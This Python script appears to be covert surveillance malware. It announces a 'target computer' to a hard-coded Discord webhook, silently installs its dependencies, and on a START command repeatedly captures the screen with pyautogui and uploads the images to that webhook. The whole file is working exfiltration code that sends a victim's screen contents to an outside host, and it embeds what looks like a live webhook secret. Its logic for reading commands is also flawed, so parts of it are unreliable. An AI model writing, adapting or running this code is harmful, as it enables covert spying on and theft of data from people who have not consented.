import subprocess
import sys
import pyautogui
import os
from time import sleep
import requests

# YOUR DISCORD WEBHOOK
discord_webhook = "https://discord.com/api/webhooks/1346209552860839987/g3dfx4FqXkbRjr1TbIJLj0LOUeMULIkvvoqbROuyDjVT0Fym6XfUiR4rhTfrjDuIMKLQ"

# Function to send a Discord message
def send_discord_message(message):
    data = {"content": message, "username": "AbhinavDucky"}
    response = requests.post(discord_webhook, json=data)
    if response.status_code == 200:
        print(f"Message sent: {message}")
    else:
        print(f"Failed to send message: {response.status_code}")

# Function to install dependencies
def install_dependency(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        send_discord_message(f"✅ Successfully installed {package}.")
    except Exception as e:
        send_discord_message(f"❌ Failed to install {package}: {str(e)}")

# List of required dependencies
required_packages = ["requests", "pyautogui"]

# Install missing dependencies
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        send_discord_message(f"🔍 Installing missing dependency: {package}...")
        install_dependency(package)

# Notify that the computer is ON
send_discord_message("🖥️ The target computer has started! Send `START` to begin screenshots.")

# Function to check for the latest message
def get_latest_message():
    response = requests.get(discord_webhook)
    if response.status_code == 200:
        messages = response.json()
        if messages and "content" in messages[-1]:
            return messages[-1]["content"].strip().upper()
    return None

# Listen for the START trigger
def wait_for_trigger():
    while True:
        latest_message = get_latest_message()
        if latest_message == "START":
            send_discord_message("📸 Screenshot process started! Send `STOP` to end.")
            return True
        sleep(5)

# Function to send screenshots
def send_screenshots():
    SCREENSHOTS = 10  # Max screenshots per session
    TIMING = 5  # Delay between screenshots

    for i in range(SCREENSHOTS):
        latest_message = get_latest_message()
        if latest_message == "STOP":
            send_discord_message("🚫 Screenshot process stopped.")
            return

        sleep(TIMING)
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")

        with open("screenshot.png", "rb") as f:
            foto = f.read()

        richiesta = {"username": "AbhinavDucky"}

        response = requests.post(discord_webhook, data=richiesta, files={f"Screen#{i + 1}.png": foto})

        if response.status_code == 200:
            send_discord_message(f"✅ Screenshot {i + 1} sent successfully!")
        else:
            send_discord_message(f"❌ Error sending Screenshot {i + 1}. Status code: {response.status_code}")

# Main loop
while True:
    if wait_for_trigger():
        send_screenshots()
    sleep(5)  # Keep checking for new messages
